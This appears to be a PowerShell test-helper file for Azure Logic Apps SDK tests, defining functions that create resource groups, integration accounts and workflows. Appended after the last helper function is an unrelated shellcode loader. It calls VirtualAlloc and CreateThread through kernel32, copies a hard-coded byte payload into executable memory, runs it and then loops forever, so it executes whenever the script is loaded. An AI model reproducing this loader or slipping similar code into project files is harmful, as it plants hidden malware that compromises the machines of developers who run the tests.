













function CurrentApiVersion 
{
	return "2018-07-01-preview"
}

function SampleMetadata
{
	return @{ "key1" = "value1"; "key2" = "value2"; "key3" = "value3"; }
}


function TestSetup-CreateResourceGroup
{
    $resourceGroupName = "RG-" + (getAssetname)
	$location = Get-Location "Microsoft.Resources" "resourceGroups" "West US"
    $resourceGroup = New-AzResourceGroup -Name $resourceGroupName -location $location

	return $resourceGroup
}


function TestSetup-CreateIntegrationAccount ([string]$resourceGroupName, [string]$integrationAccountName)
{
	$location = Get-Location "Microsoft.Logic" "integrationAccounts" "West US"
	$integrationAccount = New-AzIntegrationAccount -ResourceGroupName $resourceGroupName -IntegrationAccountName $integrationAccountName -Location $location -Sku "Standard"
	return $integrationAccount
}


function TestSetup-CreateWorkflow ([string]$resourceGroupName, [string]$workflowName, [string]$AppServicePlan)
{
	$location = Get-Location "Microsoft.Logic" "workflows" "West US"
    $resourceGroup = New-AzResourceGroup -Name $resourceGroupName -location $rglocation -Force

	$definitionFilePath = Join-Path "Resources" "TestSimpleWorkflowDefinition.json"
	$parameterFilePath = Join-Path "Resources" "TestSimpleWorkflowParameter.json"
	$workflow = $resourceGroup | New-AzLogicApp -Name $workflowName -Location $location -DefinitionFilePath $definitionFilePath -ParameterFilePath $parameterFilePath
    return $workflow
}


function SleepInRecordMode ([int]$SleepIntervalInMillisec)
{
	$mode = $env:AZURE_TEST_MODE
	if ( $mode -ne $null -and $mode.ToUpperInvariant() -eq "RECORD")
	{
		Sleep -Milliseconds $SleepIntervalInMillisec 
	}
}
$gL8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gL8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcb,0xd9,0x74,0x24,0xf4,0xba,0x58,0x12,0x9a,0x31,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x14,0x03,0x56,0x4c,0xf0,0x6f,0xcd,0x84,0x76,0x8f,0x2e,0x54,0x17,0x19,0xcb,0x65,0x17,0x7d,0x9f,0xd5,0xa7,0xf5,0xcd,0xd9,0x4c,0x5b,0xe6,0x6a,0x20,0x74,0x09,0xdb,0x8f,0xa2,0x24,0xdc,0xbc,0x97,0x27,0x5e,0xbf,0xcb,0x87,0x5f,0x70,0x1e,0xc9,0x98,0x6d,0xd3,0x9b,0x71,0xf9,0x46,0x0c,0xf6,0xb7,0x5a,0xa7,0x44,0x59,0xdb,0x54,0x1c,0x58,0xca,0xca,0x17,0x03,0xcc,0xed,0xf4,0x3f,0x45,0xf6,0x19,0x05,0x1f,0x8d,0xe9,0xf1,0x9e,0x47,0x20,0xf9,0x0d,0xa6,0x8d,0x08,0x4f,0xee,0x29,0xf3,0x3a,0x06,0x4a,0x8e,0x3c,0xdd,0x31,0x54,0xc8,0xc6,0x91,0x1f,0x6a,0x23,0x20,0xf3,0xed,0xa0,0x2e,0xb8,0x7a,0xee,0x32,0x3f,0xae,0x84,0x4e,0xb4,0x51,0x4b,0xc7,0x8e,0x75,0x4f,0x8c,0x55,0x17,0xd6,0x68,0x3b,0x28,0x08,0xd3,0xe4,0x8c,0x42,0xf9,0xf1,0xbc,0x08,0x95,0x36,0x8d,0xb2,0x65,0x51,0x86,0xc1,0x57,0xfe,0x3c,0x4e,0xdb,0x77,0x9b,0x89,0x1c,0xa2,0x5b,0x05,0xe3,0x4d,0x9c,0x0f,0x27,0x19,0xcc,0x27,0x8e,0x22,0x87,0xb7,0x2f,0xf7,0x32,0xbd,0xa7,0x38,0x6a,0x64,0xb5,0xd1,0x69,0x97,0xb9,0x14,0xe7,0x71,0xe9,0x06,0xa7,0x2d,0x49,0xf7,0x07,0x9e,0x21,0x1d,0x88,0xc1,0x51,0x1e,0x42,0x6a,0xfb,0xf1,0x3b,0xc2,0x93,0x68,0x66,0x98,0x02,0x74,0xbc,0xe4,0x04,0xfe,0x33,0x18,0xca,0xf7,0x3e,0x0a,0xba,0xf7,0x74,0x70,0x6c,0x07,0xa3,0x1f,0x90,0x9d,0x48,0xb6,0xc7,0x09,0x53,0xef,0x2f,0x96,0xac,0xda,0x24,0x1f,0x39,0xa5,0x52,0x60,0xad,0x25,0xa2,0x36,0xa7,0x25,0xca,0xee,0x93,0x75,0xef,0xf0,0x09,0xea,0xbc,0x64,0xb2,0x5b,0x11,0x2e,0xda,0x61,0x4c,0x18,0x45,0x99,0xbb,0x98,0xb9,0x4c,0x85,0xee,0xd3,0x4c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$jumj=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($jumj.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$jumj,0,0,0);for (;;){Start-sleep 60};

